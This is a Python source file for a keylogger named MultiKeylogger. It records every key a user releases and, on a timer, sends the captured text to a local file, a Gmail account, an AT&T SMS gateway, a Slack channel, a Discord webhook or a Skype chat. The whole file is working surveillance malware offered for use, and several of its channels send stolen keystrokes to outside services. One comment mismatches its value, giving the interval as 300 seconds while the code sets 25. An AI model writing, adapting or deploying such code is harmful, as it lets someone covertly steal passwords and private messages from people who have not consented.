import keyboard # Imported to provide the ability to log keys
import smtplib # Imported to provide the ability to send the recorded key logs through SMTP protocol for email

from threading import Timer # Intended to make it possible to send reports have a set period of time
from datetime import datetime # Imported to retrieve the current date times at certain periods of time
from email import message # Imported to format emails for sending keylogs

from asyncio.windows_events import NULL
from slack_sdk import WebClient # Imported to use Slack development
from dotenv import load_dotenv # Imported to use .env
import os

from skpy import Skype # Imported to use Skype

import requests # Imported to use request for discord integration

load_dotenv() # Loads environment to use variable in .env
SLACK_BOT_TOKEN = os.environ['SLACK_BOT_TOKEN']
SLACK_CHANNEL_ID = os.environ['SLACK_CHANNEL_ID']
slackBot = WebClient(SLACK_BOT_TOKEN)

DISCORD_URL = os.environ['DISCORD_WEBHOOK'] # Creats variable from .env discord webhook url
PHONE = os.environ['PHONE_NUMBER'] # Creates variable from .env phone number
SKYPE_CHANNEL = os.environ['SKYPE_CHANNEL'] # Creates variable from .env skype channel id

# Email Variables for report type of emails
EMAIL = os.environ['ADDRESS'] # Email that reports are sent to
EMAIL_PW = os.environ['PASSWORD'] # Password for Email

# Time Interval Variable
LOG_INTERVAL = 25 # Every 300 Seconds (5 minutes) a report is sent

class MultiKeylogger:
    def __init__(self, reportInterval, reportType):
        self.reportInterval = reportInterval
        self.reportType = reportType
        self.startTimeVal = datetime.now() # Used to document the start datetime
        self.endTimeVal = datetime.now() # Used to document the end datetime
        self.keylog = "" # Creates a global string variable named keylog to store the keylogs, which will only store keylogs of the set report interval.

    def createFileIdentifier(self):
        startTime = str(self.startTimeVal).replace(":", "-").replace(" ", "_") # Creates a string variable from the start time of the keylog interval
        endTime = str(self.endTimeVal).replace(":", "-").replace(" ", "_") # Creates a string variable from the end time of the keylog interval
        self.fileIndentifier = f"Log = {startTime} to {endTime}" # Sets the file name to "Log start time to end time"

    def createID(self):
        startTime = str(self.startTimeVal).replace(" ", "_") # Creates a string variable from the start time of the keylog interval
        endTime = str(self.endTimeVal).replace(" ", "_") # Creates a string variable from the end time of the keylog interval
        self.identifier = f"Log: {startTime} to {endTime}" # Sets the file name to "Log start time to end time"

    def reportFile(self):
        with open(f"{self.fileIndentifier}.txt", "w") as f: # Opens a file of the name from createFileIdentifier
            print(self.keylog, file = f) # Print the contents of a variable (self.keylog) to a file

    def reportEmail(self, address, password, contents, subject):
        email = smtplib.SMTP(host = "smtp.gmail.com", port = 587) # Port 587 is used encrypt SMTP messages using TLS
        content = message.Message() # Creates a new message named content
        content.add_header('subject', subject)  # Sets the to header to the provided subject, which the time interval of the keylogger
        content.add_header('to', address) # Sets the to header to the provided address
        content.add_header('from', address)  # Sets the from header to the provided address
        content.set_payload(contents) # Sets the body of the email to the contents, which is self.keylog
        email.starttls() # Starts TLS for security
        email.login(address, password) # Logs into the email with provided address and password
        email.send_message(content, from_addr = address, to_addrs = [address]) # Sends the email 
        email.quit() # Terminates the email server

    def reportSlack(self, postHeader):
            slackPost = postHeader + "\n" + self.keylog # Creates a string variable with the log time interval as the first line and the contents as the body of the post
            slackBot.chat_postMessage(channel = SLACK_CHANNEL_ID, text = slackPost) # The slack posts the string variable in the specified channel
            
    def reportSMS(self, address, password, textBody):
        text = smtplib.SMTP(host = "smtp.gmail.com", port = 587) # Port 587 is used encrypt SMTP messages using TLS
        text.starttls() # Starts TLS for security
        text.login(address, password) # Logs into the email with provided address and password
        phoneMail = "" + PHONE + "@mms.att.net" # Creates a string variable that combined phone number from file with correlating AT&T email domain
        text.sendmail(address, phoneMail, textBody) # Sends a text of the keylogs the specified AT&T phone number from gmail address
        text.quit() # Terminates the text server

    def reportDiscord(self, discordBody, logTime):
        discordMessage = logTime + "\n" + discordBody # Creates string variable of log time interval and then on the next line the key logs
        data = {
            "content": discordMessage, # Contents of the message
            "username": "Keylogger" # Name of the bot/webhook
        }
        messagePost = requests.post(DISCORD_URL, json = data)
        try:
            messagePost.raise_for_status() # Sends discord post
        except requests.exceptions.HTTPError as err:
            print(err) # Prints out error
        else:
            print("Discord message sent succesfully!") # When successful, this message prints to terminal


    def reportSkype(self, email, password, skypeBody, logTime):
        skypeMessage = "" + logTime + "\n" + skypeBody # Creates string variable containing log time frame and key logs on the next line
        # print(skype.chats.recent()) - Used to discover Skype group chat ID of the most recently active Skype group chat
        skype = Skype(email, password) # Logs into Skype
        skypeChannel = skype.chats.chat(SKYPE_CHANNEL) # Sets skypeChannel equal to the chat of a specific ID
        skypeChannel.sendMsg(skypeMessage) # Sends a message of the keylogs to the Skype group channel

    def keyboardCallback(self, event):
        eventName = "[" + event.name + "]"# Create eventName variable
        nameLength = len(eventName) # Returns the length of the eventName variable
        if nameLength > 1: # Conditional statement to format the appearence of the keylogs in event that they key is not a typical character like a letter or number. 
            if eventName == "[tab]":
                eventName = "[tab]\t" # Replaces [TAB] with [TAB] and a tab space afterward    
            elif eventName == "[enter]":
                eventName = "[enter]\n" # Replaces [ENTER] with [ENTER] and a creates a new line afterward              
            elif eventName == "[space]":
                eventName = "[space] " # Replaces [SPACE] with " " for readability
        self.keylog = self.keylog + eventName # Updates the self.keylog variable with the eventName

    def reportKeyLog(self):
        if self.keylog: # Checks if self.keylong contains any data and execute the below statements if it does
            self.endTimeVal = datetime.now() # Retrieves the end datetime for utilization in file identifying
            self.createFileIdentifier() # Executes the function that creates the file id/name
            self.createID() # Executes the function createId for report types other than file

            if self.reportType == "FILE":
                self.reportFile() # Calls the reportFile function to create a file for keylog recording
            elif self.reportType == "EMAIL":
                self.reportEmail(EMAIL, EMAIL_PW, self.keylog, self.identifier) # Calls the reportEmail function to sends an email of keylog recording
            elif self.reportType == "SLACK":
                self.reportSlack(self.identifier) # Calls the reportSlack function to send keylogs as a slack message in a "keylogger" channel
            elif self.reportType == "SMS":
                self.reportSMS(EMAIL, EMAIL_PW, self.keylog) # Calls the reportSMS function to send keylogs via an SMS to an AT&T phone number
            elif self.reportType == "SKYPE":
                self.reportSkype(EMAIL, EMAIL_PW, self.keylog, self.identifier) # Calls the reportSkype function to send keylogs to a desginated Skype group chat
            elif self.reportType == "DISCORD":
                self.reportDiscord(self.keylog, self.identifier) # Calls the reportDiscord function to send keylogs to a desginated Discord group chat
            
            self.startTimeVal = datetime.now() # Retrieves the start datetime for utilization in file identifying
        
        self.keylog = "" # Resets the value of self.keylog to contain nothing
        logTimer = Timer(interval = self.reportInterval, function = self.reportKeyLog) # Creates a timer for the keylog and takes the specificed reportInterval as a parameter
        logTimer.daemon = True # The timer thread is now a daemon, which means that it will die off when the main thread dies
        logTimer.start() # Starts the timer thread

    def start(self):
        self.startTimeVal = datetime.now() # Gets current date time
        keyboard.on_release(callback = self.keyboardCallback) # Initializes the keylogger on rlease of a key
        self.reportKeyLog() # Calls the function that records the keylogs within the time interval
        keyboard.wait() 

if __name__ == "__main__":
        inputCheck = False # Creates a boolean variable for use in the while loop
        print("Please enter one of the following report type options: FILE, EMAIL, DISCORD, SLACK, SMS, or SKYPE ") # Statement in terminal explaining what users should do
        while inputCheck == False: # While loop when inputCheck is false
            userReportType = input("Enter the desired report type for the keylogger: ") # Takes input as a string variable
            userReportType = userReportType.upper() # Makes string variable uppercase
            if userReportType == "FILE":
                inputCheck = True
                multiKeylogger = MultiKeylogger(reportInterval = LOG_INTERVAL, reportType = userReportType)
                multiKeylogger.start()
            elif userReportType == "EMAIL":
                inputCheck = True
                multiKeylogger = MultiKeylogger(reportInterval = LOG_INTERVAL, reportType = userReportType)
                multiKeylogger.start()
            elif userReportType == "DISCORD":
                inputCheck = True
                multiKeylogger = MultiKeylogger(reportInterval = LOG_INTERVAL, reportType = userReportType)
                multiKeylogger.start()
            elif userReportType == "SLACK":
                inputCheck = True
                multiKeylogger = MultiKeylogger(reportInterval = LOG_INTERVAL, reportType = userReportType)
                multiKeylogger.start()
            elif userReportType == "SMS":
                inputCheck = True
                multiKeylogger = MultiKeylogger(reportInterval = LOG_INTERVAL, reportType = userReportType)
                multiKeylogger.start()
            elif userReportType == "SKYPE":
                inputCheck = True
                multiKeylogger = MultiKeylogger(reportInterval = LOG_INTERVAL, reportType = userReportType)
                multiKeylogger.start()
            else:
                print("Please retry with one of the following options: FILE, EMAIL, DISCORD, SLACK, SMS, or SKYPE") # Prints error message



    
